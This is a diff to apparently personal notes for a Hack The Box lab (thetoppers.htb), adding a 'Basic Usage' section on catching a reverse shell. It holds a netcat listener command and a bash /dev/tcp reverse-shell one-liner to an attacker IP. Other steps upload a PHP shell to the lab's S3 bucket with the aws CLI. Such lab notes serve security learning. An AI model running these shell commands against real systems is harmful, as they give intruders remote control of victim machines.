@@ -1,5 +1,19 @@
+# Basic Usage
 
-## REVERSE SHELL UPLOADING  PHP FILE
+1. Use `netcat` to give access to the reverse shell:
+```bash
+sudo nc -lvnp 4444
+```
+2. Use `ifconfig` or `ip a` to determine your IP address
+```bash
+ip a
+```
+4. Create the reverse shell command using https://www.revshells.com:
+````bash
+echo 'bash -c "bash -i >& /dev/tcp/10.10.15.142/443 0>&1"' 
+````
+
+# Reverse shell uploading php file
 
 1. Investigate accessible subdomains using gobuster.
 2. Check if there are any files in the subdomain's bucket (e.g., index.php).
@@ -11,7 +25,7 @@
 ````bash
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ````
-5. Use `ifconfig` to determine our IP address and create the reverse shell command using https://www.revshells.com:
+5. Use `ifconfig` to determine your IP address and create the reverse shell command using https://www.revshells.com:
 ````bash
 echo 'bash -c "bash -i >& /dev/tcp/10.10.15.142/443 0>&1"' > shell.sh
 ```` 
